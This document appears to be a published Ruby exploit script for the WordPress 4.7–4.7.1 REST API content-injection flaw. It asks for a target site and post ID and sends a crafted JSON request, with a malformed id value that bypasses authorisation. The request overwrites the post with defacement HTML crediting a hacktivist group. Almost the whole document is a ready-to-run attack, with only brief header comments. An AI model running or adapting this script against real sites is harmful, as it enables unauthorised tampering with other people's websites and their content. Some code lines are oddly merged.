# Exploit Title: WP Content Injection

# Date: 31 Jan' 2017

# Exploit Author: Harsh Jaiswal 

# Vendor Homepage: http://wordpress.org 

# Version: Wordpress 4.7 - 4.7.1 (Patched in 4.7.2) 

# Tested on: Backbox ubuntu Linux 

# Based on https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html 

# Credits : Marc, Sucuri, Brute 

# usage : gem install rest-client 

# Lang : Ruby 

require 'rest-client' 

require 'json' puts 

"Enter Target URI (With wp directory)"

targeturi = gets.chomp 

puts "Enter Post ID" postid = gets.chomp.to_i

response = RestClient.post( "#{targeturi}/index.php/wp-json/wp/v2/posts/#{postid}",

{ 

    

    "id" => "#{15058}justrawdata",

    

    "title" => "Xenotime Gans",

    "content" => "<center><h1>My Team : GARUT CYBER HACKTIVIST</h1>" 

}.to_json, 

:content_type => :json, 

:accept => :json 

) {|response, request, result| response }

if(response.code == 200)

puts "Done! '#{targeturi}/index.php?p=#{postid}'" 

else 

    puts "This site is not Vulnerable" 

    end
